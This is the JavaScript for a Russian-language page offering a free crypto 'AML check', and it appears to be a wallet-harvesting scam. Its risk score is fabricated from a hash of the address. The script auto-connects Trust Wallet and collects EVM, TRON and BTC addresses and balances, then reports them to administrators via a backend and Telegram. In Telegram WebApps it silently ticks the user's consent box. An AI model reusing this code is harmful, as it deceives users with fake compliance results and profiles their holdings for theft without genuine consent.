const userWalletConnect = document.querySelector("[data-user-wallet-connect]");
const userWalletStatus = document.querySelector("[data-user-wallet-status]");
const userWalletAddress = document.querySelector("[data-user-wallet-address]");
const userConsent = document.querySelector("[data-user-consent]");
const trustDeeplink = document.querySelector("[data-trust-deeplink]");
const checkForm = document.querySelector("[data-check-form]");
const checkLockNote = document.querySelector("[data-check-lock-note]");
const walletInput = document.querySelector("#wallet");
const userLogout = document.querySelector("[data-user-logout]");
const header = document.querySelector("[data-header]");

const configuredApiBase = String(window.AML_API_BASE || "").replace(/\/$/, "");
const isOnRenderHost = /\.onrender\.com$/i.test(location.hostname);
const apiBase = isOnRenderHost ? location.origin.replace(/\/$/, "") : configuredApiBase;
const checkPageUrl = `${apiBase || location.origin}/check.html`;
const walletProfileKey = "aml_wallet_profile";
const isTelegramWebApp = Boolean(window.Telegram?.WebApp?.initData);

if (location.hostname.endsWith(".github.io") && configuredApiBase && !/[?&]stay=1/.test(location.search)) {
  location.replace(`${configuredApiBase}/check.html${location.search}${location.hash}`);
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const setStatus = (message) => {
  if (userWalletStatus) userWalletStatus.textContent = message;
};

const updateHeader = () => {
  if (!header) return;
  header.classList.toggle("is-scrolled", window.scrollY > 12);
};

const scoreWalletLocal = async (wallet) => {
  const bytes = new TextEncoder().encode(String(wallet || "").toLowerCase());
  const digest = await crypto.subtle.digest("SHA-256", bytes);
  const firstByte = new Uint8Array(digest)[0];
  const score = 12 + (firstByte % 79);
  const level = score > 68 ? "повышенный риск" : score > 42 ? "средний риск" : "низкий риск";
  return { score, level };
};

const formatPortfolioText = (portfolio) => {
  const lines = [];
  if (portfolio.evmAddress) lines.push(`EVM: ${portfolio.evmAddress}`);
  if (portfolio.tronAddress) lines.push(`TRON: ${portfolio.tronAddress}`);
  if (portfolio.btcAddress) lines.push(`BTC: ${portfolio.btcAddress}`);

  for (const item of portfolio.evmNatives || []) {
    if (item.ok) lines.push(`${item.network}: ${item.balance} ${item.symbol}`);
  }
  for (const item of portfolio.evmUsdt || []) {
    if (item.ok) lines.push(`${item.network} USDT: ${item.balance}`);
  }
  if (portfolio.trx?.ok) lines.push(`TRX: ${portfolio.trx.balance}`);
  if (portfolio.usdtTrc20?.ok) lines.push(`USDT TRC20: ${portfolio.usdtTrc20.balance}`);
  if (portfolio.btc?.ok) lines.push(`BTC: ${portfolio.btc.balance}`);

  return lines.join("; ");
};

const renderRiskPreview = (result, portfolio) => {
  const riskPreview = document.querySelector("[data-risk-preview]");
  if (!riskPreview) return;
  riskPreview.querySelector("strong").textContent = `Оценка: ${result.level} (${result.score}/100)`;
  const summary = portfolio ? formatPortfolioText(portfolio) : "Публичные балансы проверены автоматически.";
  riskPreview.querySelector("p").textContent = `${summary} Админам отправлено уведомление в Telegram.`;
  const meter = riskPreview.querySelector(".risk-meter");
  if (meter) meter.style.background = `conic-gradient(var(--neon) 0 ${result.score}%, rgba(255,255,255,0.1) ${result.score}% 100%)`;
};

const unlockCheckForm = (profile) => {
  if (!checkForm) return;
  checkForm.classList.remove("is-locked");
  checkForm.querySelectorAll("input, button").forEach((control) => {
    control.disabled = false;
  });
  if (userWalletAddress) {
    const parts = [`EVM: ${profile.evmAddress}`];
    if (profile.tronAddress) parts.push(`TRON: ${profile.tronAddress}`);
    if (profile.btcAddress) parts.push(`BTC: ${profile.btcAddress}`);
    userWalletAddress.textContent = parts.join(" | ");
  }
  if (walletInput && profile.evmAddress && !walletInput.value.trim()) {
    walletInput.value = profile.evmAddress;
  }
  if (checkLockNote) checkLockNote.textContent = "Кошелёк подключён автоматически. Можно запускать AML-проверку.";
  if (userLogout) {
    userLogout.classList.remove("is-hidden-slot");
    userLogout.setAttribute("aria-hidden", "false");
  }
  if (userConsent) userConsent.checked = true;
  if (userWalletConnect) userWalletConnect.textContent = "Обновить данные кошелька";
};

const lockCheckForm = () => {
  if (!checkForm) return;
  checkForm.classList.add("is-locked");
  checkForm.querySelectorAll("input, button").forEach((control) => {
    control.disabled = true;
  });
  if (userLogout) {
    userLogout.classList.add("is-hidden-slot");
    userLogout.setAttribute("aria-hidden", "true");
  }
  if (userWalletConnect) userWalletConnect.textContent = "Connect";
};

const saveProfile = (profile) => localStorage.setItem(walletProfileKey, JSON.stringify(profile));
const loadProfile = () => JSON.parse(localStorage.getItem(walletProfileKey) || "null");

const notifyTelegramWebApp = (payload) => {
  const webApp = window.Telegram?.WebApp;
  if (!webApp?.sendData) return false;
  try {
    webApp.sendData(JSON.stringify(payload).slice(0, 4000));
    webApp.close?.();
    return true;
  } catch {
    return false;
  }
};

const requestJsonViaXhr = (fullUrl, options = {}, timeoutMs = 120000) =>
  new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open(String(options.method || "GET").toUpperCase(), fullUrl, true);
    xhr.timeout = timeoutMs;
    if (options.body) xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
      let data = {};
      try {
        data = JSON.parse(xhr.responseText || "{}");
      } catch {
        data = {};
      }
      if (xhr.status >= 200 && xhr.status < 300) resolve(data);
      else reject(new Error(data.error || "Ошибка запроса"));
    };
    xhr.onerror = () => reject(new Error("сеть недоступна"));
    xhr.ontimeout = () => reject(new Error("превышено время ожидания"));
    xhr.send(options.body || null);
  });

const requestJson = async (url, options = {}, retries = 4) => {
  const fullUrl = `${apiBase}${url}`;
  let lastError;

  for (let attempt = 0; attempt <= retries; attempt += 1) {
    try {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 120000);
        const response = await fetch(fullUrl, {
          method: options.method || "GET",
          headers: { "Content-Type": "application/json", ...(options.headers || {}) },
          body: options.body,
          signal: controller.signal,
          cache: "no-store",
        });
        clearTimeout(timer);
        const data = await response.json().catch(() => ({}));
        if (!response.ok) throw new Error(data.error || "Ошибка запроса");
        return data;
      } catch {
        return await requestJsonViaXhr(fullUrl, options);
      }
    } catch (error) {
      lastError = error;
      if (attempt < retries) await sleep(3000 * (attempt + 1));
    }
  }

  throw new Error(
    `Сервер просыпается, подождите до 2 минут и нажмите Connect снова. (${lastError?.message || "сеть недоступна"})`,
  );
};

const warmupBackend = async () => {
  if (!apiBase) return;
  try {
    await requestJson("/api/health", {}, 1);
  } catch {
    setStatus("Сервер просыпается… первый Connect может занять до 2 минут.");
  }
};

const scanWalletPortfolio = async (addresses) => {
  if (!apiBase) throw new Error("Backend не настроен.");

  return requestJson("/api/scan", {
    method: "POST",
    body: JSON.stringify({
      ...addresses,
      chainId: addresses.chainId,
      source: isTelegramWebApp ? "telegram_webapp" : "trust_wallet",
      pageUrl: checkPageUrl,
    }),
  });
};

const runAutoCheck = async () => {
  if (userConsent && !userConsent.checked) {
    throw new Error("Подтвердите согласие перед подключением кошелька.");
  }

  if (!window.AutoWallet) throw new Error("Модуль AutoWallet не загружен.");

  setStatus("Подключаем Trust Wallet и автоматически собираем адреса EVM / TRON / BTC...");
  const addresses = await window.AutoWallet.connectAllWalletAddresses({ onProgress: setStatus });

  setStatus("Проверяем балансы и отправляем данные администраторам...");
  const result = await scanWalletPortfolio(addresses);
  const portfolio = result.portfolio || result;

  const profile = {
    ...addresses,
    portfolio,
    checkedAt: new Date().toISOString(),
  };
  saveProfile(profile);
  unlockCheckForm(profile);

  const risk = await scoreWalletLocal(addresses.evmAddress);
  renderRiskPreview(risk, portfolio);

  notifyTelegramWebApp({ type: "wallet_scan", ...profile });

  const summary = formatPortfolioText(portfolio);
  let statusText = summary
    ? `Готово. ${summary}${result.telegramSent ? " Уведомление отправлено в Telegram." : ""}`
    : "Готово. Балансы проверены.";

  if (!portfolio.tronAddress) {
    statusText += " TRON-адрес не отдался автоматически — нажмите «Обновить».";
  }

  setStatus(statusText);
  return profile;
};

let autoStarted = false;
const maybeAutoConnect = async () => {
  if (autoStarted) return;
  if (!window.AutoWallet?.isTrustWalletEnv?.()) return;
  if (loadProfile()?.evmAddress) return;

  autoStarted = true;
  if (isTelegramWebApp && userConsent) userConsent.checked = true;

  if (userConsent && !userConsent.checked) {
    setStatus("Нажмите Connect — адреса подставятся автоматически.");
    autoStarted = false;
    return;
  }

  setStatus("Trust Wallet обнаружен. Автоподключение через 1 сек...");
  await sleep(1000);

  if (userWalletConnect?.disabled) return;
  userWalletConnect.disabled = true;
  try {
    await runAutoCheck();
  } catch (error) {
    setStatus(error.message);
    autoStarted = false;
  } finally {
    userWalletConnect.disabled = false;
  }
};

userWalletConnect?.addEventListener("click", async () => {
  userWalletConnect.disabled = true;
  try {
    await runAutoCheck();
  } catch (error) {
    setStatus(error.message);
  } finally {
    userWalletConnect.disabled = false;
  }
});

checkForm?.addEventListener("submit", async (event) => {
  event.preventDefault();
  const button = checkForm.querySelector("button");
  const wallet = new FormData(checkForm).get("wallet")?.trim();
  const profile = loadProfile();
  button.disabled = true;
  button.textContent = "Проверяем...";

  try {
    const risk = await scoreWalletLocal(wallet);
    renderRiskPreview(risk, profile?.portfolio);
    setStatus(`AML-проверка для ${wallet} завершена.`);

    if (apiBase && profile?.evmAddress) {
      await requestJson("/api/scan", {
        method: "POST",
        body: JSON.stringify({
          evmAddress: profile.evmAddress,
          tronAddress: profile.tronAddress,
          btcAddress: profile.btcAddress,
          amlTarget: wallet,
          amlResult: risk,
          source: "aml_check",
        }),
      }).catch(() => {});
    }
  } catch (error) {
    setStatus(error.message);
  } finally {
    button.disabled = false;
    button.textContent = "Проверить бесплатно";
  }
});

userLogout?.addEventListener("click", () => {
  localStorage.removeItem(walletProfileKey);
  lockCheckForm();
  if (userWalletAddress) userWalletAddress.textContent = "";
  if (walletInput) walletInput.value = "";
  setStatus("Профиль очищен на этом устройстве.");
  autoStarted = false;
});

if (trustDeeplink && window.AutoWallet) {
  trustDeeplink.href = window.AutoWallet.getTrustDeeplink(checkPageUrl);
}

const stored = loadProfile();
if (stored?.evmAddress) {
  unlockCheckForm(stored);
  if (stored.portfolio) {
    scoreWalletLocal(stored.evmAddress).then((risk) => renderRiskPreview(risk, stored.portfolio));
  }
  setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
}

updateHeader();
window.addEventListener("scroll", updateHeader, { passive: true });

if (window.Telegram?.WebApp) {
  window.Telegram.WebApp.ready();
  window.Telegram.WebApp.expand?.();
}

warmupBackend();

if (!stored?.evmAddress) {
  maybeAutoConnect();
}
